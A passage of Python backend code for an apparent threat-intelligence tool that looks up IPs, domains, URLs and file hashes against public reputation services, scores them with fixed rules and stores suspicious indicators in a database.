            r = await hc.get(url, headers=headers, timeout=6.0)
            if r.status_code in (429, 503):
                await _asyncio.sleep(delay + i * 1.0)
                delay *= 1.8
                continue
            return r
        except (httpx.TimeoutException, httpx.RequestError):
            if i == tries - 1:
                return None
            await _asyncio.sleep(delay)
    return None


async def _urlscan_submit_scan(hc: httpx.AsyncClient, target_url: str) -> Optional[dict]:
    """Submit a fresh urlscan.io scan when no prior scan exists.

    Returns `{scan_id, result_url, api_url}` on success, or a dict with
    `{error: str}` on failure (so the UI can explain to the user why they
    see no preview — e.g., domain doesn't resolve, rate-limited, etc.).
    Fresh scans typically take 30-60 s — we don't block waiting for them;
    we return the pending info so the UI can render a "Fresh scan in
    progress" link.
    """
    if not URLSCAN_API_KEY or not target_url:
        return None
    try:
        r = await hc.post(
            "https://urlscan.io/api/v1/scan/",
            headers={"API-Key": URLSCAN_API_KEY, "Content-Type": "application/json"},
            json={"url": target_url, "visibility": "public"},
            timeout=8.0,
        )
        if r.status_code == 200:
            j = r.json()
            return {"scan_id": j.get("uuid"), "result_url": j.get("result"),
                    "api_url": j.get("api"), "message": j.get("message", "")}
        # 400/429/etc. — surface the reason so the UI can tell the user
        # why they see no preview instead of a silent empty state.
        try:
            j = r.json()
            msg = j.get("message") or j.get("description") or f"HTTP {r.status_code}"
        except Exception:
            msg = f"HTTP {r.status_code}"
        return {"error": msg, "http_status": r.status_code}
    except Exception as e:  # noqa: BLE001
        return {"error": f"Network error: {type(e).__name__}"}


async def _urlscan_screenshot_is_valid(hc: httpx.AsyncClient, screenshot_url: str) -> bool:
    """HEAD check the screenshot to make sure urlscan CDN isn't rate-limiting
    it (429 → HTML error page). Only include preview.screenshot in the response
    when this passes so the UI never renders a broken image."""
    if not screenshot_url:
        return False
    try:
        r = await hc.head(screenshot_url, timeout=4.0, follow_redirects=True)
        if r.status_code != 200:
            return False
        ct = (r.headers.get("content-type") or "").lower()
        return ct.startswith("image/")
    except Exception:
        return False


async def _greynoise_ip(hc: httpx.AsyncClient, ip: str) -> dict:
    """GreyNoise Community API — free, no key. Tells us whether the IP is a
    known mass-scanner (RIOT), malicious, benign, or unseen. Massively cuts
    triage noise: 95% of hits on scan-only IPs are false alarms."""
    if not ip:
        return {}
    cached = await get_cached(db, "greynoise", ip)
    if cached is not None:
        return cached
    async with _gate("greynoise"):
        async with instrument("greynoise") as m:
            try:
                r = await hc.get(f"https://api.greynoise.io/v3/community/{ip}", timeout=6.0)
                # GreyNoise returns 200 for observed IPs AND 404 for "never
                # observed" — both bodies contain useful classification.
                if r.status_code in (200, 404):
                    data = r.json() or {}
                else:
                    data = {}
                m["hit"] = bool(data)
            except Exception:
                data = {}
    if data:
        await set_cached(db, "greynoise", ip, data)
    return data


async def _otx_ip_pulses(hc: httpx.AsyncClient, ip: str) -> dict:
    """AlienVault OTX per-IP pulse count. Uses OTX_API_KEY if set (unauth
    still returns limited data). A pulse is a curated threat report — high
    pulse count = actively-referenced adversary IP."""
    if not ip:
        return {}
    cached = await get_cached(db, "otx_ip", ip)
    if cached is not None:
        return cached
    headers = {}
    key = os.environ.get("OTX_API_KEY")
    if key:
        headers["X-OTX-API-KEY"] = key
    async with _gate("otx_ip"):
        async with instrument("otx_ip") as m:
            try:
                r = await hc.get(
                    f"https://otx.alienvault.com/api/v1/indicators/IPv4/{ip}/general",
                    headers=headers, timeout=6.0,
                )
                if r.status_code == 200:
                    j = r.json()
                    pi = j.get("pulse_info") or {}
                    data = {
                        "pulse_count": pi.get("count", 0),
                        "pulses": [
                            {"name": p.get("name"), "adversary": p.get("adversary")}
                            for p in (pi.get("pulses") or [])[:5]
                        ],
                        "reputation": j.get("reputation"),
                    }
                else:
                    data = {}
                m["hit"] = bool(data)
            except Exception:
                data = {}
    if data:
        await set_cached(db, "otx_ip", ip, data)
    return data


async def _circl_cve_from_cpes(hc: httpx.AsyncClient, cpes: list) -> list:
    """CIRCL CVE search — free, no key. Given the CPEs from Shodan
    InternetDB (`cpe:/a:openbsd:openssh:9.6p1` etc), look up known CVEs. This
    gives us real CVE data without needing a paid Shodan account."""
    if not cpes:
        return []
    # Convert `cpe:/a:vendor:product:version` → `vendor:product` for the CIRCL
    # search endpoint (which is imprecise but wide-coverage).
    lookups = []
    for cpe in cpes[:5]:  # bound requests
        parts = cpe.replace("cpe:/", "").split(":")
        if len(parts) >= 3:
            lookups.append((parts[1], parts[2]))
    if not lookups:
        return []
    cached = await get_cached(db, "circl_cve", ",".join(f"{v}:{p}" for v, p in lookups))
    if cached is not None:
        return cached
    out = []
    async with _gate("circl_cve"):
        async with instrument("circl_cve") as m:
            try:
                for vendor, product in lookups:
                    r = await hc.get(
                        f"https://cve.circl.lu/api/search/{vendor}/{product}",
                        timeout=6.0,
                    )
                    if r.status_code != 200:
                        continue
                    j = r.json() or {}
                    # Response shape: {"data": [{"id": "CVE-...", "summary": ...}, ...]}
                    hits = j.get("data") if isinstance(j, dict) else j
                    if not hits:
                        continue
                    for h in hits[:3]:
                        cve_id = h.get("id") or h.get("cve") or h.get("Published")
                        summary = (h.get("summary") or "")[:180]
                        cvss = h.get("cvss") or h.get("cvss3")
                        if cve_id:
                            out.append({"id": cve_id, "summary": summary, "cvss": cvss,
                                        "product": f"{vendor}:{product}"})
                m["hit"] = bool(out)
            except Exception:
                pass
    # cap total CVEs to 15 to avoid dossier bloat
    out = out[:15]
    await set_cached(db, "circl_cve", ",".join(f"{v}:{p}" for v, p in lookups), out)
    return out


async def _shodan_ip(hc: httpx.AsyncClient, ip: str) -> dict:
    if not ip:
        return {}
    cached = await get_cached(db, "shodan_ip", ip)
    if cached is not None:
        return cached
    async with _gate("shodan_ip"):
        async with instrument("shodan_ip") as m:
            try:
                r = await hc.get(f"https://internetdb.shodan.io/{ip}", timeout=6.0)
                data = r.json() if r.status_code == 200 else {}
                m["hit"] = bool(data)
            except Exception:
                data = {}
    if data:
        await set_cached(db, "shodan_ip", ip, data)
    return data


async def _geo_ip(hc: httpx.AsyncClient, ip: str) -> dict:
    if not ip:
        return {}
    cached = await get_cached(db, "geo_ip", ip)
    if cached is not None:
        return cached
    async with _gate("geo_ip"):
        async with instrument("geo_ip") as m:
            try:
                r = await hc.get(
                    f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,org,as,query",
                    timeout=6.0,
                )
                j = r.json()
                data = j if j.get("status") == "success" else {}
                m["hit"] = bool(data)
            except Exception:
                data = {}
    if data:
        await set_cached(db, "geo_ip", ip, data)
    return data


async def _resolve_host(hc: httpx.AsyncClient, host: str) -> Optional[str]:
    """Resolve a hostname's first A record via Google DNS-over-HTTPS (no key)."""
    if not host:
        return None
    cached = await get_cached(db, "dns_resolve", host)
    if cached is not None:
        return cached or None
    async with _gate("dns_resolve"):
        async with instrument("dns_resolve") as m:
            try:
                r = await hc.get(
                    f"https://dns.google/resolve?name={host}&type=A",
                    headers={"Accept": "application/json"},
                    timeout=5.0,
                )
                if r.status_code == 200:
                    for ans in (r.json() or {}).get("Answer", []):
                        if ans.get("type") == 1 and ans.get("data"):
                            m["hit"] = True
                            await set_cached(db, "dns_resolve", host, ans["data"])
                            return ans["data"]
            except Exception:
                pass
    # Do NOT cache the negative result — DNS resolution may be transient.
    return None


# ---------------------------------------------------------------------------
# OSINT Auto-Ingest — when an investigation lookup surfaces malicious/suspicious
# reputation across VT / AbuseIPDB / urlscan / Hybrid Analysis / MalwareBazaar
# / CIRCL, the IOC is automatically upserted into the curated `iocs` collection
# with a deterministic risk score, severity, threat-name and structured
# reputation snapshot. No LLM involvement — purely rule-based, idempotent.
# ---------------------------------------------------------------------------

def _compute_verdict_and_score(kind: str, enrichment: Optional[dict], reputation: Optional[dict]) -> dict:
    """Return {verdict, risk_score, severity, threat_name, tags, summary, notes}
    for the given lookup result. verdict ∈ {clean, suspicious, malicious}."""
    reputation = reputation or {}
    enrichment = enrichment or {}
    score = 0
    tags: List[str] = []
    reason_bits: List[str] = []
    threat_name: Optional[str] = None
    summary: dict = {"signals": {}}

    # --- VirusTotal (all kinds) -------------------------------------------
    # VT weighting: any malicious hit is a real signal in SOC triage even at
    # 2/70. We use 8× per malicious + 3× per suspicious (cap 60) so 1 mal
    # scores 8, 2 mal scores 16 — both above the low-suspicious floor of 15.
    # `_vt_lookup` returns a FLAT dict ({malicious, suspicious, ...}); some
    # code paths surface the raw v3 API shape ({stats: {malicious, ...}}) so
    # we accept either.
    vt = reputation.get("vt") or {}
    vt_stats = vt.get("stats") if isinstance(vt.get("stats"), dict) else vt
    vt_mal = int(vt_stats.get("malicious") or 0)
    vt_susp = int(vt_stats.get("suspicious") or 0)
    if vt_mal or vt_susp:
        score += min(60, vt_mal * 8 + vt_susp * 3)
        tags.append(f"vt:{vt_mal}m/{vt_susp}s")
        reason_bits.append(f"VT {vt_mal} malicious / {vt_susp} suspicious")
        summary["signals"]["virustotal"] = {"malicious": vt_mal, "suspicious": vt_susp,
                                            "harmless": int(vt_stats.get("harmless") or 0),
                                            "undetected": int(vt_stats.get("undetected") or 0)}
        # Prefer VT-supplied family names (threat_label, popular_threat_names,
        # threat_names) — same field lives at either level.
        for src in (vt, vt_stats):
            if threat_name:
                break
            label = src.get("threat_label")
            if label:
                threat_name = str(label)[:80]
                break
            names = src.get("popular_threat_names") or src.get("threat_names")
            if isinstance(names, list) and names:
                threat_name = str(names[0])[:80]
                break

    # --- AbuseIPDB (ip only) ----------------------------------------------
    ab = reputation.get("abuseipdb") or {}
    ab_conf = int(ab.get("abuseConfidenceScore") or ab.get("abuse_confidence") or 0)
    if ab_conf:
        score += int(ab_conf * 0.4)
        tags.append(f"abuseipdb:{ab_conf}")
        reason_bits.append(f"AbuseIPDB {ab_conf}%")
        summary["signals"]["abuseipdb"] = {"confidence": ab_conf,
                                           "total_reports": ab.get("totalReports") or ab.get("total_reports")}

    # --- urlscan (domain / url) — verdict can be at enrichment root or nested
    us_verdict = ""
    if isinstance(enrichment, dict):
        us_verdict = (enrichment.get("verdict") or "").lower()
        if not us_verdict:
            us = enrichment.get("urlscan")
            if isinstance(us, dict):
                us_verdict = (us.get("verdict") or "").lower()
    if us_verdict == "malicious":
        score += 40
        tags.append("urlscan:malicious")
        reason_bits.append("urlscan verdict: malicious")
    elif us_verdict == "suspicious":
        score += 20
        tags.append("urlscan:suspicious")
        reason_bits.append("urlscan verdict: suspicious")
    if us_verdict:
        summary["signals"]["urlscan"] = {"verdict": us_verdict}

    # --- Hybrid Analysis (hash / url) -------------------------------------
    ha = reputation.get("hybrid_analysis")
    if isinstance(ha, dict):
        ha_verdict = (ha.get("verdict") or "").lower()
        ha_score = ha.get("threat_score")
        ha_family = ha.get("vx_family") or ha.get("family")
        ha_mscan = int(ha.get("malicious_scanners") or 0)
        if ha_verdict == "malicious" or (isinstance(ha_score, int) and ha_score >= 80):
            score += 40
            tags.append("ha:malicious")
            reason_bits.append(f"Hybrid Analysis: malicious ({ha_score if ha_score is not None else 'n/a'})")
        elif ha_verdict == "suspicious" or ha_mscan >= 1 or (isinstance(ha_score, int) and ha_score >= 50):
            score += 20
            tags.append("ha:suspicious")
            reason_bits.append("Hybrid Analysis: suspicious")
        if ha_family and not threat_name:
            threat_name = str(ha_family)[:80]
        if ha_verdict or ha_score:
            summary["signals"]["hybrid_analysis"] = {"verdict": ha_verdict or None,
                                                     "threat_score": ha_score,
                                                     "family": ha_family,
                                                     "malicious_scanners": ha_mscan or None}

    # --- MalwareBazaar (hash only, known-bad DB) --------------------------
    mb = reputation.get("malwarebazaar")
    if isinstance(mb, dict) and (mb.get("found") or mb.get("query_status") == "ok"):
        score += 50
        tags.append("malwarebazaar")
        family = mb.get("signature") or mb.get("family")
        if family and not threat_name:
            threat_name = str(family)[:80]
        reason_bits.append(f"MalwareBazaar: {family or 'known sample'}")
        summary["signals"]["malwarebazaar"] = {"signature": mb.get("signature"),
                                               "family": mb.get("family"),
                                               "file_type": mb.get("file_type")}

    # --- CIRCL hashlookup (hash) ------------------------------------------
    if isinstance(enrichment, dict) and enrichment.get("kind") == "hash":
        if enrichment.get("known_malicious"):
            score += 80
            tags.append("circl:known-malicious")
            reason_bits.append("CIRCL: known-malicious")
            summary["signals"]["circl"] = {"known_malicious": True,
                                           "source_label": enrichment.get("source_label")}

    score = max(0, min(100, int(score)))

    # Hard-signal fast-path: any explicit vendor flag guarantees the IOC is
    # persisted (verdict >= suspicious) regardless of the numeric score. This
    # catches PUP / low-count VT hits (e.g. 2/70) that would otherwise fall
    # below the numeric threshold. Each of these is a first-party detection,
    # not a heuristic derivative, so we honor it as ground truth.
    has_hard_signal = (
        vt_mal >= 1
        or ab_conf >= 50
        or us_verdict in ("malicious", "suspicious")
        or (isinstance(reputation.get("hybrid_analysis"), dict)
            and (reputation["hybrid_analysis"].get("verdict") or "").lower() in ("malicious", "suspicious"))
        or (isinstance(reputation.get("malwarebazaar"), dict)
            and (reputation["malwarebazaar"].get("found") or reputation["malwarebazaar"].get("query_status") == "ok"))
        or (isinstance(enrichment, dict) and enrichment.get("known_malicious"))
    )
    if has_hard_signal and score < 15:
        # Floor the score into low-suspicious so it enters the DB with a real
        # signal — but never override a higher computed score.
        score = 15

    # Deterministic verdict + severity mapping
    if score >= 70:
        verdict, severity = "malicious", "critical" if score >= 85 else "high"
    elif score >= 30:
        verdict, severity = "suspicious", "medium"
    elif score >= 15:
        verdict, severity = "suspicious", "low"
    else:
        verdict, severity = "clean", "low"

    if not threat_name and reason_bits:
        threat_name = f"OSINT: {reason_bits[0]}"[:80]

    summary["verdict"] = verdict
    summary["risk_score"] = score
    summary["reason_bits"] = reason_bits

    return {
        "verdict": verdict,
        "risk_score": score,
        "severity": severity,
        "threat_name": threat_name,
        "tags": tags,
        "summary": summary,
        "notes": ("Auto-ingested from OSINT: " + "; ".join(reason_bits))[:280] if reason_bits else None,
    }


async def _auto_ingest_from_osint(value: str, kind: str, enrichment: Optional[dict], reputation: Optional[dict]) -> Optional[dict]:
    """If OSINT verdict is suspicious/malicious, upsert the IOC into the curated
    DB with reputation-derived fields. Idempotent; analyst-authored records keep
    their metadata but still get a refreshed risk_score + osint_summary.
    Returns the persisted record snapshot (or None when clean/unrecognized)."""
    if kind == "unknown":
        return None
    computed = _compute_verdict_and_score(kind, enrichment, reputation)
    if computed["verdict"] not in ("suspicious", "malicious"):
        return None

    key = _ioc_key(value)
    now = now_iso()
    try:
        existing = await db.iocs.find_one({"key": key}, {"_id": 0})
    except Exception:
        existing = None

    # Deduped, stable-order tag list derived from reputation signals.
    auto_tags = ["auto-ingest", f"verdict:{computed['verdict']}", f"risk:{computed['risk_score']}"] + list(computed["tags"] or [])
    dedup: List[str] = []
    seen = set()
    for t in auto_tags:
        t = str(t).strip()
        if t and t.lower() not in seen:
            dedup.append(t)
            seen.add(t.lower())

    if existing:
        updates: dict = {
            "risk_score": computed["risk_score"],
            "osint_summary": computed["summary"],
            "last_reputation_at": now,
            "updated_at": now,
        }
        if existing.get("auto_added"):
            # Fully-managed record — refresh derived fields.
            updates["threat_name"] = computed["threat_name"] or existing.get("threat_name")
            updates["severity"] = computed["severity"]
            updates["source"] = "OSINT Auto-Ingest"
            updates["notes"] = computed["notes"] or existing.get("notes")
            merged = list(existing.get("tags") or []) + dedup
        else:
            # Analyst-authored — preserve metadata, only append reputation tags.
            merged = list(existing.get("tags") or [])
            for t in dedup:
                if t.lower() not in {x.lower() for x in merged}:
                    merged.append(t)
        # Dedup merged tag list once (case-insensitive, preserve order).
        uniq: List[str] = []
        seen2 = set()
        for t in merged:
            if t.lower() not in seen2:
                uniq.append(t)
                seen2.add(t.lower())
        updates["tags"] = uniq
        try:
            await db.iocs.update_one({"key": key}, {"$set": updates})
        except Exception as e:
            logger.warning(f"Auto-ingest update failed for {value}: {e}")
            return None
        return {**existing, **updates}

    # Insert brand new record.
    rec = IocRecord(
        value=value,
        key=key,
        type=kind,
        threat_name=computed["threat_name"],
        tags=dedup,
        source="OSINT Auto-Ingest",
        severity=computed["severity"],
        notes=computed["notes"],
        risk_score=computed["risk_score"],
        auto_added=True,
        osint_summary=computed["summary"],
        last_reputation_at=now,
    )
    try:
        await db.iocs.insert_one(rec.model_dump())
    except Exception as e:
        logger.warning(f"Auto-ingest insert failed for {value}: {e}")
        return None
    return rec.model_dump()




async def _do_lookup(hc: httpx.AsyncClient, value: str) -> dict:
    """Full IOC lookup: classify + free enrichment + optional key-based reputation."""
    value = (value or "").strip()
    kind = _classify_ioc(value)
    if kind == "unknown":
        return {"value": value, "type": "unknown", "links": {}, "enrichment": None, "reputation": None, "local_db": None}
    normalized = value.replace("[.]", ".")
    result = {"value": value, "type": kind, "links": _ioc_links(value, kind), "enrichment": None, "reputation": None, "local_db": None}

    try:
        local = await db.iocs.find_one({"key": _ioc_key(value)}, {"_id": 0})
        if local:
            result["local_db"] = {
                "threat_name": local.get("threat_name"),
                "severity": local.get("severity"),
                "tags": local.get("tags", []),
                "source": local.get("source"),
                "notes": local.get("notes"),
                "created_at": local.get("created_at"),
            }
    except Exception:
        pass

    try:
        if kind == "ip":
            sh, gj, gn, otx = await asyncio.gather(
                _shodan_ip(hc, normalized),
                _geo_ip(hc, normalized),
                _greynoise_ip(hc, normalized),
                _otx_ip_pulses(hc, normalized),
            )
            cves = await _circl_cve_from_cpes(hc, sh.get("cpes", []))
            result["enrichment"] = {
                "kind": "ip",
                "geo": {"country": gj.get("country"), "city": gj.get("city"), "isp": gj.get("isp"), "org": gj.get("org"), "asn": gj.get("as")} if gj else None,
                "open_ports": sh.get("ports", []),
                "hostnames": sh.get("hostnames", []),
                "tags": sh.get("tags", []),
                "vulns": sh.get("vulns", []),
                "cpes": sh.get("cpes", []),  # Software fingerprint (OS, services). Feb 2026 for bulk dossier.
                "greynoise": gn if gn else None,       # Community classification
                "otx": otx if otx else None,           # AlienVault OTX per-IP pulse count
                "cves_by_cpe": cves,                   # CIRCL CVE lookup — real CVE coverage without paid Shodan
                "sources": [s for s in ["Shodan InternetDB", "ip-api.com",
                            "GreyNoise" if gn else None,
                            "AlienVault OTX" if otx else None,
                            "CIRCL CVE" if cves else None] if s],
            }
        elif kind in ("domain", "url"):
            from urllib.parse import urlparse
            parsed = urlparse(normalized) if kind == "url" else None
            host = ((parsed.netloc if parsed else normalized).split(":")[0]) if (parsed or normalized) else ""
            # Full requested URL (only for URL inputs).
            requested_url = normalized if kind == "url" else None

            def _norm_url(u: str) -> str:
                return (u or "").rstrip("/").lower()

            # urlscan search always keys on domain for broad recall; ranking below picks the
            # scan whose page matches the requested URL first, then falls back to path prefix,
            # then any scan for the host. Homepage is only a last-resort fallback.

            async def urlscan():
                cached = await get_cached(db, "urlscan", host or "")
                if cached is not None:
                    return cached
                async with _gate("urlscan"):
                    async with instrument("urlscan") as m:
                        try:
                            headers = {"API-Key": URLSCAN_API_KEY} if URLSCAN_API_KEY else {}

                            def _norm_host(u: str) -> str:
                                try:
                                    from urllib.parse import urlparse as _up
                                    h = (_up(u).netloc or "").lower().split(":")[0]
                                    return h[4:] if h.startswith("www.") else h
                                except Exception:
                                    return ""

                            target_host = (host[4:] if host.startswith("www.") else host).lower()

                            all_results: list[dict] = []
                            scan_count = 0

                            # Step 1 — for URL inputs, try an exact URL match first.
                            if requested_url:
                                exact_q = f'page.url:"{requested_url}"'
                                r1 = await _urlscan_get_with_backoff(
                                    hc, f"https://urlscan.io/api/v1/search/?q={exact_q}&size=5", headers,
                                )
                                if r1 is not None and r1.status_code == 200:
                                    j1 = r1.json()
                                    for x in (j1.get("results", []) or []):
                                        if _norm_host(x.get("task", {}).get("url", "")) == target_host:
                                            all_results.append(x)
                                    scan_count = j1.get("total", 0) or scan_count

                            # Step 2 — quoted-domain search + strict host filter.
                            # Fallback: if strict filter yields nothing, accept
                            # subdomains so we don't return an empty preview for
                            # domains that only have subdomain scans (e.g. root
                            # `cloudflare.com` when only `challenges.cloudflare.com`
                            # is present in urlscan).
                            raw_j2_results: list[dict] = []
                            if host:
                                dq = f'page.domain:"{host}"'
                                r2 = await _urlscan_get_with_backoff(
                                    hc, f"https://urlscan.io/api/v1/search/?q={dq}&size=25", headers,
                                )
                                if r2 is not None and r2.status_code == 200:
                                    j2 = r2.json()
                                    raw_j2_results = j2.get("results", []) or []
                                    filtered = [x for x in raw_j2_results if _norm_host(x.get("task", {}).get("url", "")) == target_host]
                                    existing_ids = {x.get("_id") for x in all_results}
                                    for x in filtered:
                                        if x.get("_id") not in existing_ids:
                                            all_results.append(x)
                                    scan_count = scan_count or j2.get("total", 0) or 0

                            # Subdomain fallback: only if we found nothing exact.
                            if not all_results and raw_j2_results:
                                def _is_subdomain(u: str) -> bool:
                                    n = _norm_host(u)
                                    return bool(n) and (n == target_host or n.endswith("." + target_host))
                                for x in raw_j2_results:
                                    if _is_subdomain(x.get("task", {}).get("url", "")):
                                        all_results.append(x)

                            recent = [{"url": x["task"]["url"], "date": x["task"].get("time"), "score": x.get("verdicts", {}).get("overall", {}).get("score"), "screenshot": x.get("screenshot")} for x in all_results[:5]]

                            def _is_home(u: str) -> bool:
                                n = _norm_url(u)
                                return n in (f"http://{host}", f"https://{host}", f"http://www.{host}", f"https://www.{host}")

                            def _rank(x: dict) -> int:
                                u = _norm_url(x.get("task", {}).get("url", ""))
                                if not x.get("screenshot"):
                                    return 99
                                if requested_url:
                                    req = _norm_url(requested_url)
                                    if u == req:
                                        return 0
                                    if _is_home(req):
                                        return 0 if _is_home(u) else 3
                                    if req and u.startswith(req + "/"):
                                        return 1
                                    if req.startswith(u + "/") and not _is_home(u):
                                        return 2
                                    if not _is_home(u):
                                        return 3
                                    return 5
                                return 0 if _is_home(u) else 3

                            ranked = sorted(all_results, key=_rank)
                            preview = None
                            for x in ranked:
                                if x.get("screenshot"):
                                    ss_url = x["screenshot"]
                                    # Validate screenshot is a real image before
                                    # exposing it — urlscan CDN often 429s the
                                    # image endpoint separately from the API.
                                    if await _urlscan_screenshot_is_valid(hc, ss_url):
                                        preview = {
                                            "screenshot": ss_url,
                                            "url": x.get("task", {}).get("url"),
                                            "result": x.get("result"),
                                        }
                                        break

                            # Screenshot CDN check failed but urlscan clearly has
                            # scan data for this host (existing landing page).
                            # Return a preview WITHOUT the screenshot rather than
                            # nulling everything and triggering an unnecessary
                            # fresh submission (Feb 2026 bug: cyberhanto.com).
                            # The frontend renders the landing-page link even
                            # when the screenshot thumbnail is absent.
                            if preview is None and ranked:
                                best = ranked[0]
                                preview = {
                                    "screenshot": None,
                                    "url": best.get("task", {}).get("url"),
                                    "result": best.get("result"),
                                    "screenshot_unavailable": True,
                                }

                            # Auto-submit a fresh urlscan.io scan ONLY when there
                            # are ZERO prior scans for this host. When prior scans
                            # exist we surface the existing landing page directly
                            # instead of paying submission latency + adding a
                            # duplicate scan for a host urlscan already knows.
                            fresh = None
                            submit_target = requested_url or (f"https://{host}" if host else None)
                            if not all_results and submit_target:
                                fresh = await _urlscan_submit_scan(hc, submit_target)

                            payload = {
                                "scan_count": scan_count,
                                "recent_scans": recent,
                                "preview": preview,
                                "fresh_scan": fresh,
                            }
                            m["hit"] = bool(recent) or bool(preview)
                            # Only cache POSITIVE results — never cache empty/none
                            # responses because they're usually transient urlscan
                            # slowness or rate-limit backoffs, not real emptiness.
                            if recent or preview:
                                await set_cached(db, "urlscan", host or "", payload)
                            return payload
                        except Exception:
                            fallback = {"scan_count": 0, "recent_scans": [], "preview": None, "fresh_scan": None}
                            return fallback

            us, resolved = await asyncio.gather(urlscan(), _resolve_host(hc, host))
            sources = ["Google DNS", "urlscan.io"]
            enr = {
                "kind": "web",
                "host": host,
                "resolved_ip": resolved,
                "geo": None,
                "open_ports": [],
                "hostnames": [],
                "vulns": [],
                "scan_count": us["scan_count"],
                "recent_scans": us["recent_scans"],
                "preview": us.get("preview"),
                "fresh_scan": us.get("fresh_scan"),
                "sources": sources,
            }
            if resolved:
                sh, gj = await asyncio.gather(_shodan_ip(hc, resolved), _geo_ip(hc, resolved))
                enr["geo"] = {"country": gj.get("country"), "city": gj.get("city"), "isp": gj.get("isp"), "org": gj.get("org"), "asn": gj.get("as")} if gj else None
                enr["open_ports"] = sh.get("ports", [])
                enr["hostnames"] = sh.get("hostnames", [])
                enr["vulns"] = sh.get("vulns", [])
                enr["sources"] = ["Google DNS", "Shodan InternetDB", "ip-api.com", "urlscan.io"]
            result["enrichment"] = enr
        else:
            # File hash — key-free lookup against CIRCL hashlookup (known-file DB)
            enr = {
                "kind": "hash",
                "hash_type": kind,
                "found": False,
                "known_malicious": False,
                "filename": None,
                "filesize": None,
                "product": None,
                "source_label": None,
                "note": "Not found in the CIRCL known-file database. Use the deep links below to check reputation on VirusTotal, MalwareBazaar and others.",
                "sources": ["CIRCL hashlookup"],
            }
            try:
                cached = await get_cached(db, "circl_hash", normalized)
                if cached is not None:
                    r_status, r_json = 200, cached
                else:
                    async with _gate("circl_hash"):
                        async with instrument("circl_hash") as m:
                            r = await hc.get(
                                f"https://hashlookup.circl.lu/lookup/{kind}/{normalized}",
                                headers={"Accept": "application/json"}, timeout=6.0,
                            )
                            r_status = r.status_code
                            r_json = r.json() if r_status == 200 else None
                            m["hit"] = r_status == 200 and isinstance(r_json, dict) and not r_json.get("message")
                            if m["hit"]:
                                await set_cached(db, "circl_hash", normalized, r_json)
                if r_status == 200 and isinstance(r_json, dict) and not r_json.get("message"):
                    j = r_json
                    enr["found"] = True
                    enr["known_malicious"] = bool(j.get("KnownMalicious"))
                    enr["filename"] = j.get("FileName")
                    enr["filesize"] = j.get("FileSize")
                    enr["product"] = (j.get("ProductCode") or {}).get("ProductName") if isinstance(j.get("ProductCode"), dict) else None
                    enr["source_label"] = j.get("KnownMalicious") or ("NSRL known-good file" if j.get("RDS:package_id") else "Known file")
                    enr["note"] = None
            except Exception:
                pass
            result["enrichment"] = enr
    except Exception as e:
        logger.error(f"IOC enrichment error: {e}")

    try:
        result["reputation"] = await _reputation(hc, kind, normalized)
    except Exception as e:
        logger.error(f"IOC reputation error: {e}")

    # OSINT Auto-Ingest — persist any suspicious/malicious verdict into the
    # curated `iocs` DB with deterministic risk_score + reputation snapshot.
    # Failures never break the lookup response.
    try:
        ingested = await _auto_ingest_from_osint(value, kind, result.get("enrichment"), result.get("reputation"))
        if ingested:
            # Refresh the `local_db` snapshot the frontend uses so the Analyzer
            # instantly reflects the newly-persisted record without a re-fetch.
            result["local_db"] = {
                "threat_name": ingested.get("threat_name"),
                "severity": ingested.get("severity"),
                "tags": ingested.get("tags", []),
                "source": ingested.get("source"),
                "notes": ingested.get("notes"),
                "created_at": ingested.get("created_at"),
                "risk_score": ingested.get("risk_score"),
                "auto_added": bool(ingested.get("auto_added")),
                "last_reputation_at": ingested.get("last_reputation_at"),
            }
            result["auto_ingested"] = True
    except Exception as e:
        logger.warning(f"Auto-ingest hook failed for {value}: {e}")

    return result


@api_router.get("/ioc-config")
async def ioc_config():
    """Tells the frontend which key-based reputation providers are active."""
    return {
        "vt_enabled": bool(VT_API_KEY),
        "abuseipdb_enabled": bool(ABUSEIPDB_API_KEY),
        "hybrid_analysis_enabled": bool(HYBRID_ANALYSIS_API_KEY),
        "malwarebazaar_enabled": bool(MALWAREBAZAAR_API_KEY),
    }


@api_router.get("/ioc-lookup")
async def ioc_lookup(value: str):
    value = (value or "").strip()
    if not value or len(value) > 2048:
        raise HTTPException(status_code=400, detail="Provide a valid IOC (hash, IP, domain or URL)")
    if _classify_ioc(value) == "unknown":
        raise HTTPException(status_code=422, detail="Could not recognize this as a hash, IP, domain or URL")
    async with httpx.AsyncClient(timeout=12, follow_redirects=True) as hc:
        return await _do_lookup(hc, value)


class BatchIOCInput(BaseModel):
    values: List[str] = Field(default_factory=list)


@api_router.post("/ioc-lookup-batch")
async def ioc_lookup_batch(payload: BatchIOCInput):
    # Accept a list of raw entries; split each on whitespace/comma/semicolon/newline.
    tokens: List[str] = []
    for entry in (payload.values or []):
        for tok in re.split(r"[\s,;]+", (entry or "").strip()):
            tok = tok.strip()
            if tok:
                tokens.append(tok)
    # Dedupe (case-insensitive) preserving order, cap at 50.
    seen = set()
    items: List[str] = []
    for t in tokens:
        key = t.lower()
        if key not in seen:
            seen.add(key)
            items.append(t)
    if not items:
        raise HTTPException(status_code=400, detail="Provide at least one IOC to analyze")
    if len(items) > 50:
        items = items[:50]

    sem = asyncio.Semaphore(8)
    async with httpx.AsyncClient(timeout=12, follow_redirects=True) as hc:
        async def one(v: str) -> dict:
            async with sem:
                try:
                    return await _do_lookup(hc, v)
                except Exception:
                    return {"value": v, "type": "unknown", "links": {}, "enrichment": None, "reputation": None}
        results = await asyncio.gather(*[one(v) for v in items])

    return {"count": len(results), "results": results}


# ============================================================================
# CyberLab in-page OSINT enrichment — feed extracted IOCs directly into the
# same enrichment engine used by the Bulk Analyzer. Adds an optional per-IOC
# AI verdict (Claude/Gemini). Cached, capped, instrumented.
# ============================================================================

class CyberLabEnrichRequest(BaseModel):
    values: List[str] = Field(default_factory=list)
    depth: str = "comprehensive"  # "free" | "comprehensive" | "ai"
    session_id: Optional[str] = None


@api_router.post("/cyberlab/enrich-iocs")
async def cyberlab_enrich_iocs(req: CyberLabEnrichRequest):
    """Bulk OSINT enrich a list of IOCs extracted by CyberLab.

    * `depth="free"`         — Shodan / geo / DNS / urlscan / CIRCL only
    * `depth="comprehensive"` — free + VT / AbuseIPDB / HA / MalwareBazaar
    * `depth="ai"`           — comprehensive + per-IOC Claude/Gemini verdict

    Concurrency is capped at 20 IOCs per batch. Uses the existing 6h reputation
    cache and the new 24h enrichment cache — repeated batches are near-instant.
    Returns per-provider timing + cache stats so the UI can show real metrics.
    """
    if req.depth not in ("free", "comprehensive", "ai"):
        raise HTTPException(status_code=400, detail="depth must be free|comprehensive|ai")

    # Normalize + dedupe + cap
